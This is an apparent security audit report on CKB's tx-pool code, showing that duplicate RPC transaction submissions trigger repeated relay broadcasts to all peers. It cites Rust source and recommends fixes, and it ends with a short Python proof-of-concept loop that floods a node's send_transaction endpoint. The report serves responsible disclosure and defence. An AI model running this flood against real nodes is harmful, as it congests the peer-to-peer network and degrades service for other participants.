Audit Report

## Title
Unbounded Relay Amplification via Duplicate RPC Transaction Submission — (File: `tx-pool/src/process.rs`)

## Summary
The `after_process` function fires `send_result_to_relayer(TxVerificationResult::Ok { original_peer: None, tx_hash })` whenever a local RPC submission returns `Reject::Duplicated`. There is no rate-limiting, cooldown, or deduplication guard on this path. An attacker with RPC access can submit the same already-pooled transaction N times, injecting N relay events into the channel, each of which the relayer broadcasts to every connected full-relay peer — at negligible cost to the attacker.

## Finding Description

**Root cause — `after_process`, lines 538–545:**

The `None` arm (local RPC, `remote = None`) explicitly re-broadcasts on `Reject::Duplicated`:

```rust
Err(Reject::Duplicated(_)) => {
    debug!("after_process {} duplicated", tx_hash);
    // re-broadcast tx when it's duplicated and submitted through local rpc
    self.send_result_to_relayer(TxVerificationResult::Ok {
        original_peer: None,
        tx_hash,
    });
}
``` [1](#0-0) 

**Why the early-return guard does not protect this path:**

`process_tx` at lines 409–411 returns early (without calling `after_process`) only when the tx is in the *verify queue* or *orphan pool*:

```rust
if self.verify_queue_contains(&tx).await || self.orphan_contains(&tx).await {
    return Err(Reject::Duplicated(tx.hash()));
}
``` [2](#0-1) 

A tx already committed to the main pool is in neither structure, so execution falls through to `_process_tx` → `check_txid_collision` → `Err(Reject::Duplicated(...))` → `after_process` is called → relay event is fired. [3](#0-2) 

**Relay amplification — `send_bulk_of_tx_hashes`, lines 662–669:**

In the `None` branch, the tx_hash is pushed into `selected` for *every* connected peer before `mark_as_known_tx` is called. Crucially, there is no pre-check against the known-tx filter before the push, so each new relay event from a duplicate submission results in another full-peer broadcast:

```rust
None => {
    let hashes = selected
        .entry(*target)
        .or_insert_with(|| Vec::with_capacity(BUFFER_SIZE));
    hashes.push(tx_hash.clone());
    self.shared.state().mark_as_known_tx(tx_hash.clone());
}
``` [4](#0-3) 

**No back-pressure:** `send_result_to_relayer` is non-blocking and only logs on channel error — there is no mechanism to throttle the attacker. [5](#0-4) 

## Impact Explanation

Each duplicate RPC call costs the attacker only a cheap local RPC round-trip (no PoW, no fee, no new transaction). Each call injects one `TxVerificationResult::Ok` into the relay channel. The relayer drains up to `MAX_RELAY_TXS_NUM_PER_BATCH` items per tick and sends a `RelayTransactionHashes` message to every full-relay peer. Submitting the same tx N times generates N × P relay messages (P = connected peers), congesting the P2P relay channel and degrading throughput for honest peers.

This matches the allowed High impact: **"Vulnerabilities or bad designs which could cause CKB network congestion with few costs."**

## Likelihood Explanation

The RPC endpoint is the standard, documented interface for submitting transactions. Any operator who exposes the RPC (wallets, exchanges, public nodes) is vulnerable. The attacker requires no special privilege, no key material, and no new valid transaction — only one transaction already accepted into the pool. The exploit is trivially scriptable with a simple loop. [6](#0-5) 

## Recommendation

1. In the `Err(Reject::Duplicated(_))` branch for `remote = None`, suppress the relay broadcast entirely, or gate it behind a per-`tx_hash` cooldown (e.g., only re-broadcast if the last broadcast for this hash was more than N seconds ago).
2. In `send_bulk_of_tx_hashes`, check whether the `tx_hash` is already in the known-tx filter *before* pushing it into `selected` for the `original_peer = None` case, so that repeated relay events for the same hash are collapsed into a single broadcast.

## Proof of Concept

```python
import requests

RPC = "http://127.0.0.1:8114"
tx = { ... }  # any valid, fee-paying transaction

# Step 1: submit once — accepted into pool
requests.post(RPC, json={"id":1,"jsonrpc":"2.0","method":"send_transaction","params":[tx,"passthrough"]})

# Step 2: submit the same tx 1000 more times
for i in range(1000):
    r = requests.post(RPC, json={"id":i+2,"jsonrpc":"2.0","method":"send_transaction","params":[tx,"passthrough"]})
    # Each returns PoolRejectedDuplicatedTransaction (-1107) to the caller
    # but internally fires send_result_to_relayer(TxVerificationResult::Ok)

# Result: relay channel receives 1001 Ok events → 1001 × P RelayTransactionHashes
# messages sent to all connected peers, congesting the P2P relay channel.
```

### Citations

**File:** tx-pool/src/process.rs (L409-411)
```rust
        if self.verify_queue_contains(&tx).await || self.orphan_contains(&tx).await {
            return Err(Reject::Duplicated(tx.hash()));
        }
```

**File:** tx-pool/src/process.rs (L413-418)
```rust
        if let Some((ret, snapshot)) = self
            ._process_tx(tx.clone(), remote.map(|r| r.0), None)
            .await
        {
            self.after_process(tx, remote, &snapshot, &ret).await;
            ret
```

**File:** tx-pool/src/process.rs (L538-545)
```rust
                    Err(Reject::Duplicated(_)) => {
                        debug!("after_process {} duplicated", tx_hash);
                        // re-broadcast tx when it's duplicated and submitted through local rpc
                        self.send_result_to_relayer(TxVerificationResult::Ok {
                            original_peer: None,
                            tx_hash,
                        });
                    }
```

**File:** tx-pool/src/process.rs (L673-677)
```rust
    pub(crate) fn send_result_to_relayer(&self, result: TxVerificationResult) {
        if let Err(e) = self.tx_relay_sender.send(result) {
            error!("tx-pool tx_relay_sender internal error {}", e);
        }
    }
```

**File:** sync/src/relayer/mod.rs (L662-669)
```rust
                                None => {
                                    // since this tx is submitted through local rpc, it is assumed to be a new tx for all connected peers
                                    let hashes = selected
                                        .entry(*target)
                                        .or_insert_with(|| Vec::with_capacity(BUFFER_SIZE));
                                    hashes.push(tx_hash.clone());
                                    self.shared.state().mark_as_known_tx(tx_hash.clone());
                                }
```

**File:** tx-pool/src/service.rs (L805-813)
```rust
        Message::SubmitLocalTx(Request {
            responder,
            arguments: tx,
        }) => {
            let result = service.process_tx(tx, None).await.map(|_| ());
            if let Err(e) = responder.send(result) {
                error!("Responder sending submit_tx result failed {:?}", e);
            };
        }
```
